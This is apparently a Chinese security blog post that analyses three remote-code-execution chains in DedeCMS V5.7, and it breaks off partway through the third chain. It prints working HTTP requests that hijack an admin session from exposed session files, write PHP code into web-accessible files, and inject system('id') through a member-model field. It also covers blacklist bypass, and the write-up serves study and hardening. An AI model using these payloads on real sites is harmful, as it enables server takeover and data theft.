---
title: 【0day预警】写进去的代码， 总有人替你执行： DedeCMS 的三个 RCE
url: https://mp.weixin.qq.com/s/8ol2gXy8_kiD4cIapXM_dQ
source: Doonsec's feed
date: 2026-10-26
fetch_date: 2026-10-27T07:00:11.316803
---

# 【0day预警】写进去的代码， 总有人替你执行： DedeCMS 的三个 RCE

# 【0day预警】写进去的代码， 总有人替你执行： DedeCMS 的三个 RCE

YNsec安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

[@零隐网络安全实验室](https://mp.weixin.qq.com/mp/readtemplate?t=pages/link_mid_jump&biz=MzY5MzI4MjM2NQ==) 点点关注，每日更新

安全研究 · 漏洞利用链拆解 · 靶场实录

摘要前两条链聊的是「怎么把代码写进去」，这一篇补上第三条，它解决的是另一个问题：写入程序现成就有，只是被一把锁挡着。
三条链横跨零权限、后台账号、会员组合三种起点，最后落到同一件事——让一个会被 PHP 解析的文件出现在 web 目录里。而它们各自打穿的「防护」，全都只是名字：一个后缀、一个 `.bak`、一个锁文件。

**免责声明：**本文所述测试全部在授权靶场环境中完成，目标地址、会话 ID 与 token 均已脱敏（使用 RFC5737 文档专用地址段）。内容仅用于安全学习与防御加固，请勿用于任何未授权测试。

## 一、先说系统：DedeCMS 是干什么的

织梦（DedeCMS）是国内用得最久的一批 PHP 建站系统之一，V5.7 这套代码从 PHP 5.2 时代一路维护下来，政企站、学校站、中小企业站里还留着一大批。本次三个靶标的版本都是 **V5.7.118 UTF8 SP2**。

它的目录结构非常固定，记住这六层，后面所有请求都能对上号：

| 目录 | 装什么 | 与本文的关系 |
| --- | --- | --- |
| `/dede/` | 后台入口，每个功能一个 PHP 文件 | 三条链的**注入点**都在这 |
| `/member/` | 会员中心：注册、登录、投稿 | VE-0186 的引爆点、VE-0182 的入口 |
| `/data/` | 运行时数据：缓存、session、备份、模块包 | VE-0034 的起点，也是三条链的落点 |
| `/plus/` | 前台零散功能：搜索、评论、投稿 | — |
| `/include/` | 公共函数、配置读取 | VE-0186 的 **sink** 在 `config.php` |
| `/install/` | 安装程序，装完理论上该删掉，只留一个 `install_lock.txt` 当锁 | VE-0182 的**入口与靶心** |

光看目录还不够。真正决定这三条链能成立的，是它的一个设计习惯：**配置不存数据库，而是写成 PHP 文件**。

DedeCMS 里大量「系统配置」「栏目结构」「会员模型」这类东西，最终都落在 `/data/` 下的 `.inc` / `.php` 文件里，程序启动或渲染页面时 `require` 进来。原因很实在——PHP 5 时代读一个本地文件比查一次库快得多，而且这些配置几乎不变，编译进 opcache 之后接近零成本。

代价是：**这些文件必须靠「拼字符串」生成**。因为要写出 `$_MemberMod[1]=array('个人','dede_member_person');` 这种结构，只能拼接。而拼接就意味着：只要有一个变量没处理好，写下去的就是**代码**，不是数据。

💡 **为什么这一点决定了攻击面？**一个 CMS 里，「把用户输入存进数据库」是常规操作，「把用户输入写成 PHP 文件」是非常规操作。后者一旦出现，就等于给攻击者开了一个「用字符串拼代码」的入口。本文三条链，分别写的是 `data/downmix.data.php`、`data/cache/member_model.inc` 和 `dede/ve0182_chain_webshell.php`，都在这个入口里。

## 二、结论速览

三份报告、三台靶标、**同一个版本**。起点差得很远，终点一样。

| 对比项 | VE-0034 | VE-0186 | VE-0182 |
| --- | --- | --- | --- |
| 链类型 | 零权限 · 3 步 | 需账号 · 1 步 | 会员 + 管理员 · 6 步 |
| 起点 | 无任何凭据 | 后台 admin | 会员账号 + admin 备料 |
| 落点 | `data/downmix.data.php` | `data/cache/member_model.inc` | `dede/ve0182_chain_webshell.php` |
| 怎么执行 | URL 直达 | `require_once` | 模块安装器写盘 |
| 最终权限 | www-data | apache（uid=48） | apache（uid=48） |
| 打穿的「防护」 | 禁用函数黑名单 | 「.inc 不会被解析」的假设 | 安装锁 + 改名 .bak |

最后一行是我特意加的，也是这篇真正想聊的东西：**三条链打穿的防护，性质完全一样——都只是「标识」**。这个线头留到第六节收。

## 三、链一 VE-0034：从「能看目录」到「能执行命令」

这条链最值得玩味的地方是：它前面两步严格来说不叫漏洞，叫**默认配置**。

### 3.1 第一步：/data/ 把家底摊开

Apache 开着 `Options +Indexes`，而 `/data/` 下没有 index 文件，于是整个目录列表就被直接吐了出来：

HTTP 请求

GET /data/ HTTP/1.1
Host: 192.0.2.10:8080
User-Agent: Mozilla/5.0

响应（关键片段）

<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td>
    <td><a href="sessions\_7ac070552e/">sessions\_7ac070552e/</a></td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td>
    <td><a href="sessions\_72285f68ba/">sessions\_72285f68ba/</a></td></tr>

两个 `sessions_*` 目录，就是 PHP 的 session 存储路径；顺带还暴露了 `backupdata/`、`cache/`。这一步没拿到任何权限，但攻击者已经知道弹药在哪了。

### 3.2 第二步：session 文件是明文文本

这是整条链最关键、也最容易被忽略的一步：**PHP 的 session 文件不是二进制，是纯文本**，格式固定为「键名 | 序列化值 ;」。它没有 `.php` 后缀，Apache 不会把它交给 PHP 解析，直接以 text/plain 返回原文：

HTTP 请求

GET /data/sessions\_72285f68ba/sess\_k3m9q7d2pl0vhb1n8s4tfj6ura HTTP/1.1
Host: 192.0.2.10:8080

响应

last\_time|i:1784276202;
dede\_admin\_id|s:1:"1";
dede\_admin\_type|s:2:"10";
dede\_admin\_channel|s:1:"0";
dede\_admin\_name|s:5:"admin";
dede\_admin\_purview|s:15:"admin\_AllowAll ";
dede\_admin\_style|s:7:"dedecms";
token|s:32:"a1b2c3d4e5f60718293a4b5c6d7e8f90";

一眼能读出四件事：管理员 ID 是 1、类型 10（超级管理员）、权限是 `admin_AllowAll`（全放行）、以及这个会话当前的 CSRF token。

注意一个容易被忽略的前提：**攻击者根本不需要知道密码**。他要的只是「管理员曾经登录过，且那个 session 还没过期」——而 session 文件长期躺在 web 目录里，等于一把没有设回收时间的钥匙。

⚠️ **这一步不是 DedeCMS 的 bug。**它是两件「单独看都不算错」的事叠出来的：PHP session 默认就是明文文件，而站点又把 session 目录放在了 web 根下。两件事各自合理，合起来就是凭据泄露。

### 3.3 第三步：拿着别人的会话，去写自己的文件

`/dede/article_string_mix.php` 是「文章来源混合」功能——把多篇文章的来源信息合并成一段，落到 `data/downmix.data.php`。它需要 admin 会话和配套 token，而这两样刚刚都到手了：

先取当前 token

GET /dede/article\_string\_mix.php HTTP/1.1
Host: 192.0.2.10:8080
Cookie: PHPSESSID=k3m9q7d2pl0vhb1n8s4tfj6ura

写入 payload

POST /dede/article\_string\_mix.php?dopost=save HTTP/1.1
Host: 192.0.2.10:8080
Cookie: PHPSESSID=k3m9q7d2pl0vhb1n8s4tfj6ura
Content-Type: application/x-www-form-urlencoded

dopost=save&token=<取到的 token>&allsource=%3C%3Fphp+echo+%27RCE\_idQKonzx%27%3B+readfile%28%27%2Fetc%2Fhostname%27%29%3B+%3F%3E

`allsource` 解码之后，就是一行最朴素的 PHP：

实际写入的内容

<?php echo 'RCE\_idQKonzx'; readfile('/etc/hostname'); ?>

它被原样写进 `data/downmix.data.php`。**后缀是 .php，位置在 web 根目录下**——这两点直接决定了下一步。

### 3.4 第四步：访问即执行

HTTP 请求

GET /data/downmix.data.php HTTP/1.1
Host: 192.0.2.10:8080

响应

RCE\_idQKonzx7e3ce13f5905

前半段是 echo 出来的标记，后半段是 `/etc/hostname` 的真实内容；换成 `readfile('/etc/passwd')` 就吐出整份用户表。到这里，攻击者从「一个 Cookie 都没有」走到了「www-data 权限执行任意代码」。

假阳性也排查过：用三个互不相同的随机标记分别写入、分别验证，全部在响应里命中，且响应中没有出现原始的 `<?php` 文本——证明是 PHP 引擎在执行，而不是文件被当纯文本读了出来。

### 3.5 顺带说一句：黑名单为什么拦不住

这个写入点是有一道「禁用函数检测」的，报告把它归为「过滤绕过」。我不打算复述那套正则的细节，因为更有价值的结论在另一层。

这类检测的本质是**黑名单**，而黑名单在 PHP 里几乎不可能列全。读文件这条路，除了 `readfile`，还有 `file_get_contents`、`highlight_file`、`show_source`、`include`；执行命令这条路，除了第一梯队的 `system`、`exec`、`shell_exec`，还有 `popen`、`proc_open`、`passthru`、反引号。堵掉三个，攻击者换第四个就行。

更要紧的是，这道检测判断的是「文本里有没有某些词」，而不是「这段文本会不会变成代码」。前者是字符串匹配，后者是语法分析——前者永远可以被绕过，后者才可能真的拦住。修复建议里提到的 `token_get_all()` 就是这个思路：先按 PHP 语法把内容切开，再判断有没有函数调用，而不是拿正则去猜。

## 四、链二 VE-0186：后台埋雷，前台引爆

这条链只有一步，但它藏着一个比上一条更普遍的问题。所以先不看请求，先看两行代码。

### 4.1 一个字段，穿过两个语言

注入点在后台「会员模型管理」，代码把 `$table` 直接拼进了 SQL：

member\_model\_add.php:55

$query = "INSERT INTO #@\_\_member\_model
          (`id`,`name`,`table`,`description`,`issystem`,`state`)
          VALUES ('$id','$name','$table','$description',0,'$state')";
$dsql->ExecNoneQuery($query);
UpDateMemberModCache();

紧接着 `UpDateMemberModCache()` 会把这个模型重新写进缓存文件，位置在 `config.php:248`：

config.php:248（sink）

fwrite($fp1,"\$\_MemberMod[{$row->id}]=array('{$row->name}','{$row->table}');\r\n");

把这两段放在一起看，问题的形状就出来了：`$table` 这个值，**先从 HTTP 进来，穿过 SQL，最后落进 PHP 代码**。中间跨了两个语言上下文。

SQL 那一层其实是做了转义的——所以引号能安全入库、读出来还是原样。但**SQL 的转义只对 SQL 有意义**：反斜杠在 MySQL 眼里是转义符，在 PHP 眼里只是一个普通字符。等到 `fwrite` 往 PHP 代码里拼的时候，需要的是「PHP 字符串上下文」的转义，而这里一次都没做。

🔑 **这一节最该记住的一句：**转义不是「安全动作」，是「针对某种语法的动作」。上下文换一次，之前那次转义就等于没做。一个字符串跨两个语言，就要转义两次——少一次，前面那次白做。

### 4.2 塞进去的东西长什么样

提交时 `table` 字段的值是：

payload（table 字段）

x',1);system('id');//

它被存进数据库，然后在生成缓存时原样落进了文件：

生成的 data/cache/member\_model.inc

<?php
global $\_MemberMod;
$\_MemberMod=array();
$\_MemberMod[1]=array('个人','dede\_member\_person');
$\_MemberMod[2]=array('企业','dede\_member\_company');
$\_MemberMod[8888]=array('chain\_oqlmdp','x',1);system('id');//');
?>

PHP 解析这个文件时，发生了三件事：

1. `$_MemberMod[8888]=array('chain_oqlmdp','x',1);`

   —— 一条合法的数组赋值，语法完全正确，不报错；
2. `system('id');`

   —— 一条独立语句，就这么执行了；
3. `//');`

   —— 注释符把尾部多出来的 `');` 吃掉，整个文件依然是合法 PHP。

一个 payload 干三件事：**闭合字符串、插入语句、注释残骸**。这个「闭合 + 执行 + 注释」的三段式，是所有代码注入的通用骨架——不管注入的是 SQL、PHP 还是模板引擎，形状都一样。

### 4.3 引爆点在前台

`.inc` 后缀意味着这个文件不能像上一条链那样直接 URL 访问（Apache 不会把 .inc 交给 PHP 解析）。但 DedeCMS 自己会去包含它——会员注册页的模板里就是这么一行：

reg-new.htm:112

require\_once DEDEDATA.'/cache/member\_model.inc';

于是引爆只需要一个匿名 GET：

HTTP 请求（零权限）

GET /member/index\_do.php?fmdo=user&dopost=regnew HTTP/1.1
Host: 192.0.2.20:8080

响应里就带着 `uid=48(apache) gid=48(apache) groups=48(apache)`。

注意这个结构：**注入需要管理员，引爆不需要**。而且缓存文件是持久的——注入一次之后，只要文件不被重建，之后的每一个访客都在替你触发。报告专门验证了这一点：把 Cookie、Token 全部清空再访问，RCE 依然成立。

### 4.4 一个「失败」的细节，反而最有用

验证时第一次用的是 `system('echo VE0186_CHAIN_TEST_oekxfxze')`，但回显只有 `VE0186_CHAI`——被截断了。原因很朴素：`table` 是数据库字段，有长度上限，payload 超了就被切掉。

这个细节值得单独说，因为它是实战里最常见、也最容易误判的情况：**payload 有长度预算**。写入类漏洞尤其如此——数据库字段长度、文件写入上限、正则匹配长度，随便哪个都可能把你精心构造的语句截成半句。看到「回显不全」先别怀疑没打通，先量一下长度。

## 五、链三 VE-0182：先删锁，再开门

前两条链都在解决「怎么把代码写进去」。这一条解决的是另一个问题：**写入程序现成就有，只是被一把锁挡着**。

DedeCMS 装完之后，`/install/` 目录理论上该删掉。留着没删的站点，靠一个 `install_lock.txt` 兜底：安装程序一进来先 `file_exists()`，发现有锁就退出。而 `module-install.php` 本身**不做任何认证**——所以这把锁，是唯一的屏障。

于是这条链的全部工作量，就变成了：**想办法让那个文件消失**。

### 5.1 一个会员，三次跳转，删掉一个文件

报告里这一步改写过：早期方案是用后台文件管理器删锁（需要管理员），后来换成了一条纯会员侧的路。三步，每一步单独看都很「正常」：

1. **VE-0064 · 绕过验证码登录会员**

   ——拿到一个普通会员会话。不是提权，就是正常会员。
2. **VE-0125 · 发一篇文章**

   ——正文里塞一个 `<img>`，src 指向一个路径穿越的地址。
3. **VE-0201 · 把这篇文章删掉**

   ——删文时程序会清理正文里的媒...